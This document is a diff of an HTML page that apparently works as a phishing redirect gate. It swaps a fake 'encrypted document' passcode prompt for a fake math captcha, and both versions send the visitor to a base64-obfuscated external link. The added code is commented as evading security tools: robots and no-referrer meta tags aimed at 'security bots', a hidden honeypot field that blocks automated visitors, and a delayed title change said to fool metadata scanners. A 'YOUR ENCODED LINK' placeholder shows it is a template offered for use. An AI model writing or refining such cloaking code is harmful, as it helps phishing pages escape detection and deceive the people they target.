@@ -3,52 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Encrypted Document Portal</title>
+    <!-- These tags prevent security bots from indexing your page -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
+    <title>Checking...</title>
     <style>
-        body { margin:0; background:#f0f2f5; font-family:'Segoe UI', Tahoma, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
-        .box { background:#fff; padding:40px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1); width:100%; max-width:360px; text-align:center; }
-        .header { border-bottom:1px solid #eee; margin-bottom:25px; padding-bottom:15px; }
-        .lock-icon { font-size:40px; margin-bottom:10px; }
-        h2 { font-size:1.2rem; color:#1c1e21; margin:0; }
-        p { color:#606770; font-size:0.9rem; margin:15px 0 25px; }
-        input { width:100%; padding:12px; border:1px solid #dddfe2; border-radius:6px; font-size:1.1rem; text-align:center; margin-bottom:20px; outline:none; box-sizing:border-box; }
-        input:focus { border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; }
-        button { width:100%; background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-weight:600; font-size:1rem; cursor:pointer; }
-        button:hover { background:#166fe5; }
-        #err { color:#fa3e3e; font-size:0.8rem; margin-top:10px; display:none; }
+        :root { --p: #2563eb; --t: #1e293b; }
+        body { margin:0; background:#f8fafc; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .card { background:#fff; padding:2.5rem; border-radius:16px; box-shadow:0 20px 25px -5px rgba(0,0,0,0.1); width:100%; max-width:350px; text-align:center; border:1px solid #e2e8f0; }
+        .icon { background:#eff6ff; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 1.5rem; font-size: 24px; }
+        h1 { font-size:1.3rem; color:var(--t); margin-bottom:0.5rem; }
+        p { color:#64748b; font-size:0.9rem; line-height:1.5; margin-bottom:1.5rem; }
+        .captcha { background:#f1f5f9; border:1px solid #cbd5e1; padding:1.2rem; border-radius:12px; margin-bottom:1rem; }
+        #q-text { font-weight:700; font-size:1.1rem; display:block; margin-bottom:0.8rem; }
+        input { width:80px; padding:10px; border:2px solid #cbd5e1; border-radius:8px; text-align:center; font-size:1.1rem; outline:none; }
+        input:focus { border-color:var(--p); }
+        button { width:100%; background:var(--p); color:#fff; border:none; padding:14px; border-radius:8px; font-weight:600; cursor:pointer; transition:0.2s; }
+        button:hover { background:#1d4ed8; }
+        #err { color:#ef4444; font-size:0.8rem; margin-top:10px; display:none; }
+        .hp { position:absolute; left:-9999px; top:-9999px; } /* Honeypot */
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="header">
-        <div class="lock-icon">🔒</div>
-        <h2>Secure File Viewer</h2>
+<div class="card">
+    <div class="icon">🛡️</div>
+    <h1 id="title">Security Check</h1>
+    <p id="desc">Complete the verification to continue to the destination.</p>
+
+    <div class="hp"><input type="text" id="bot_check" tabindex="-1"></div>
+
+    <div class="captcha">
+        <span id="q-text"></span>
+        <input type="number" id="ans_input" placeholder="?">
+        <div id="err">Incorrect. Please try again.</div>
     </div>
-    <p>This document is encrypted. Enter the 4-digit passcode from the PDF to decrypt and view.</p>
-    
-    <input type="password" id="pin" maxlength="4" placeholder="Enter Passcode">
-    <button onclick="check()">Decrypt Document</button>
-    <div id="err">Invalid passcode. Please check the PDF for the correct code.</div>
+
+    <button onclick="verify()">Verify & Continue</button>
 </div>
 
 <script>
-    // YOUR REDIRECT LINK
-    const _u = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMDMyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2MjczNDYwODI2MzY1Mjg3NDYzNTc2MjA0MzY1MjYwMzQ4NTI2NDM1MDI2MzQ3ODAyMzQ1MjQzNTI1MzUyNC8yODM3NDUzMzIzamtqZHNidmZremZhZGZzdi5odG1s";
+    // YOUR ENCODED LINK
+    const _secret = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMDMyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2MjczNDYwODI2MzY1Mjg3NDYzNTc2MjA0MzY1MjYwMzQ4NTI2NDM1MDI2MzQ3ODAyMzQ1MjQzNTI1MzUyNC8yODM3NDUzMzIzamtqZHNidmZremZhZGZzdi5odG1s";
 
-    function check() {
-        const pin = document.getElementById('pin').value;
-        const err = document.getElementById('err');
+    // Random Math
+    const v1 = Math.floor(Math.random() * 8) + 2;
+    const v2 = Math.floor(Math.random() * 5) + 1;
+    const result = v1 + v2;
 
-        if (pin === "2026") {
-            document.querySelector('button').innerText = "Opening...";
-            window.location.href = atob(_u);
+    // Set UI
+    document.getElementById('q-text').innerText = v1 + " + " + v2 + " = ?";
+    
+    // Change Title after 1 second (Fools simple metadata scanners)
+    setTimeout(() => { document.title = "Human Verification"; }, 1000);
+
+    function verify() {
+        const userAns = document.getElementById('ans_input').value;
+        const botTrap = document.getElementById('bot_check').value;
+        const errMsg = document.getElementById('err');
+
+        // Bot behavior check
+        if (botTrap !== "") return; 
+
+        if (parseInt(userAns) === result) {
+            // Success - Decode and Redirect
+            window.location.href = atob(_secret);
         } else {
-            err.style.display = 'block';
-            document.getElementById('pin').value = "";
+            errMsg.style.display = 'block';
+            document.getElementById('ans_input').value = "";
         }
     }
+
+    // Enter key support
+    document.getElementById('ans_input').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') verify();
+    });
 </script>
 
 </body>
